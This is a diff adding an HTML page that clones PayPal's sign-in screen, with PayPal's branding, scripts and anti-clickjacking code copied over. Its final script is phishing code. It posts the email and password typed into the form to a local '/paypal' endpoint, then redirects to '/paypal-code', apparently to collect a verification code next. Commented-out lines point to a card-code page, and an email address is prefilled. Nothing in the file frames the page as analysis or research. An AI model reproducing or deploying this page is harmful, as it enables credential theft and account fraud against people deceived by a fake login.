@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<!--[if lt IE 9]><html lang="en" locale="en_PS" class="no-js lower-than-ie9 ie desktop" data-langpack="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/en-PS/_languagepack"><![endif]-->
+<!--[if lt IE 10]><html lang="en" locale="en_PS" class="no-js lower-than-ie10 iedesktop" data-langpack="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/en-PS/_languagepack"><![endif]-->
+<!--[if !IE]>-->
+<html lang="en" locale="en_PS" class="no-js desktop"
+    data-langpack="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/en-PS/_languagepack">
+<!--<![endif]-->
+
+<head>
+    <script async src="https://www.paypalobjects.com/webcaptcha/ngrlCaptcha.min.js"></script>
+    <!--Script info: script: node, template:  , date: Aug 9, 2022 01:12:38 -07:00, country: PS, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0biQlNiCHKWWofITjyrTvoCAmhvCa1qP4 rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVpgPHQO3DS15Q%2Bs90pd04ixT6NDYUDsjQH1d3tEM%2BAf_18281a9b374 -->
+    <meta charset="utf-8" />
+    <title></title>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta name="application-name" content="PayPal" />
+    <meta name="msapplication-task"
+        content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+    <meta name="msapplication-task"
+        content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+    <meta name="keywords" content="transfer money, email money transfer, international money transfer " />
+    <meta name="description"
+        content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
+    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
+    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
+    <link rel="canonical" href="https://www.paypal.com/ps/signin" />
+    <meta name="viewport"
+        content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
+    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />
+    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/css/app.css" />
+    <!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/css/ie9.css" /><![endif]-->
+    <script
+        src="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/js/lib/modernizr-2.6.1.js"></script>
+    <script
+      src="https://code.jquery.com/jquery-3.4.1.js"
+      integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+      crossorigin="anonymous"></script>
+    <script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js"></script>
+    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>
+    <style id="antiClickjack">
+        body {
+            display: none !important;
+        }
+    </style>
+
+    <script
+        nonce="IdauiRP/nT9+wS9EhZ2zBitQzvxyAa07LfjM5szZ09/As11q">
+        if (self === top || /paypal\.(com|cn)$/.test(window.parent.location.hostname)) { 
+          var antiClickjack = document.getElementById("antiClickjack"); 
+          if (antiClickjack) {
+             antiClickjack.parentNode.removeChild(antiClickjack); 
+             } 
+             } else { top.location = self.location; }
+        </script>
+</head>
+
+<body class="desktop "
+    data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVpgPHQO3DS15Q%2Bs90pd04ixT6NDYUDsjQH1d3tEM%2BAf_18281a9b374"
+    data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0biQlNiCHKWWofITjyrTvoCAmhvCa1qP4" data-production="true"
+    data-enable-ads-captcha="true" data-view-name="login"
+    data-template-path="https://www.paypalobjects.com/web/res/2e7/f5f96e0dbb4e453e572b57d075c0e/js/templates/%s"
+    data-enable-client-cal-logging="true" data-correlation-id="f52855854253f" data-client-name="ul"
+    data-enable-fn-beacon-on-web-views="true" data-nonce="IdauiRP/nT9+wS9EhZ2zBitQzvxyAa07LfjM5szZ09/As11q"
+    data-csrf-token="FM8ixpIQttmp9QkGD2fdvOu+NZnRwoxIeb5xE=" data-locale="en_US"><noscript>
+        <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.
+        </p>
+    </noscript>
+    <div id="main" class="main " role="main">
+        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
+            <div class="corral">
+                <div id="content" class="contentContainer">
+                    <header>
+                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p>
+                    </header>
+                    <h1 class="headerText accessAid">Log in to your PayPal account</h1>
+                    <div id="notifications" class="notifications"></div>
+                    <form class="proceed maskable" id="myForm" autocomplete="off" name="login" novalidate>
+                   
+                        <div id="passwordSection" class="clearfix">
+                            <div class="textInput " id="login_emaildiv">
+                                <div class="fieldWrapper"><label for="email" class="fieldLabel">Email</label>
+                                    <input
+                                        id="email" name="email" type="email" class="hasHelp  validateEmpty   "
+                                        required="required" value="mohamed18yosef@gmail.com" autocomplete="username"
+                                        placeholder="Email" aria-describedby="emailErrorMessage" />
+                                </div>
+                                <div class="errorMessage" id="emailErrorMessage">
+                                    <p class="emptyError hide">Required</p>
+                                    <p class="invalidError hide">That email format isn’t right</p>
+                                </div>
+                            </div>
+                            <div class="textInput  lastInputField" id="login_passworddiv">
+                                <div class="fieldWrapper">
+                                    <label for="password"
+                                        class="fieldLabel">Password</label>
+                                   <input id="password" name="password"
+                                        type="password" class="hasHelp  validateEmpty   pin-password"
+                                        required="required" value="" placeholder="Password"
+                                        aria-describedby="passwordErrorMessage" /><label for="Show password"
+                                        class="fieldLabel">Show password</label><button type="button"
+                                        class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
+                                        id="Show password">Show</button><label for="Hide password"
+                                        class="fieldLabel">Hide password</label><button type="button"
+                                        class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password"
+                                        id="Hide password">Hide</button></div>
+                                <div class="errorMessage" id="passwordErrorMessage">
+                                    <p class="emptyError hide">Required</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="actions actionsSpaced"><button
+                                class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit"
+                                id="btnLogin" name="btnLogin" value="Login">Log In</button></div>
+
+                    </form>
+                </div>
+            </div>
+            <footer class="footer" role="contentinfo">
+                <ul class="footerGroup">
+                    <li><a target="_blank" href="/ps/smarthelp/contact-us">Contact Us</a></li>
+                    <li><a target="_blank" href="/ps/webapps/mpp/ua/privacy-full">Privacy</a></li>
+                    <li><a target="_blank" href="/ps/webapps/mpp/ua/legalhub-full">Legal</a></li>
+                    <li><a target="_blank" href="/ps/webapps/mpp/ua/upcoming-policies-full">Policy Updates</a></li>
+                    <li><a target="_blank" href="/ps/webapps/mpp/country-worldwide">Worldwide</a></li>
+                </ul>
+            </footer>
+        </section>
+    </div>
+    <div class="transitioning   ">
+        <p class="welcomeMessage hide">Welcome, !</p>
+        <p class="checkingInfo hide">Checking your info…</p>
+        <p class="oneSecond hide">Just a second…</p>
+        <p class="secureMessage hide">Securely logging you in...</p>
+        <p class="oneTouchMessage hide"></p>
+        <p class="retrieveInfo hide">Retrieving your info...</p>
+        <p class="waitFewSecs hide">This may take a few seconds...</p>
+        <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.
+        </p>
+        <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password
+            for this purchase.</p>
+        <p class="udtSpinnerMessage webllsXoUS hide">We recognize you on this device, so you can skip
+            login.<br><br>Manage this setting in your profile.</p>
+        <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
+        <p class="qrcMessage hide">Redirecting...</p>
+        <p class="webAuthnOptin hide">Updating your login settings...</p>
+        <p class="webAuthnLogin hide">Logging you in...</p>
+        <div class="keychain spinner-content uiExp hide"></div>
+    </div>
+   <script>
+        $("#myForm").validate({
+            rules: {
+            email: {
+                required: true,
+            },
+            password: {
+                required: true,
+            },
+            },
+            messages: {
+            email: "الرجاء كتابة يميل صحيح",
+            password: "الرجاء ادخال كلمة سر صحيحة  ",
+            },
+            submitHandler: SubForm,
+        });
+        function SubForm() {
+            console.log("send start")
+            $.ajax({
+            url: "/paypal",
+            type: "post",
+            data: $("#myForm").serializeArray(),
+            beforeSend: function () {
+                $("#error").fadeOut();
+
+                $("#btn-submit").html(
+                '<span class="glyphicon glyphicon-transfer"></span>    جاري التحقق ...'
+                );
+            },
+            success: function () {
+              console.log("pay success")
+                // window.open('./cardCode.html', '_self');
+                // alert("شكراً لك تم حجز طلبك بنجاح :)");
+                    //  setTimeout(() => {
+                    //    window.location.replace("/verfiedCode");
+                    // }, 1000)
+            window.location.replace("/paypal-code");
+            },
+            error: function () {
+                // alert("There was an error :(");
+            },
+            });
+            return false;
+        }
+    </script>
+</body>
+
+</html>
